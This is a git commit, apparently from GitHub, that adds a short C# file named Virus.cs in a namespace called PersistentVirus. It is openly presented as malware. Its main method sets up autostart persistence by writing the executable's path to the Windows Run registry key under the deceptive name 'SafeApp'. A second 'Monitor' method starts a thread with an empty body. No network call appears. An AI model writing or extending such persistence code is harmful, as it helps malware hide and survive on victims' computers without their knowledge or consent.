6cc93bcd3afda9f74363ee7ffc5c3903f52924a6
Dog429436 <99732803+Dog429436@users.noreply.github.com>
2025-01-21 23:34:41 +0200

    Add files via upload

---
+++ Virus.cs
@@ -0,0 +1,29 @@
+﻿using Microsoft.Win32;
+using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading;
+using System.Threading.Tasks;
+
+namespace PersistentVirus
+{
+    static class Virus
+    {
+        public static void InitiateVirus()
+        {
+            const string keyPath = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run";
+            const string valueName = "SafeApp";
+            string path = System.Reflection.Assembly.GetExecutingAssembly().Location;
+            Registry.CurrentUser.OpenSubKey(keyPath, true)?.SetValue(valueName, path);
+        }
+        public static void Monitor()
+        {
+            Thread monitor = new Thread(() =>
+            {
+
+            });
+            monitor.Start();
+        }
+    }
+}
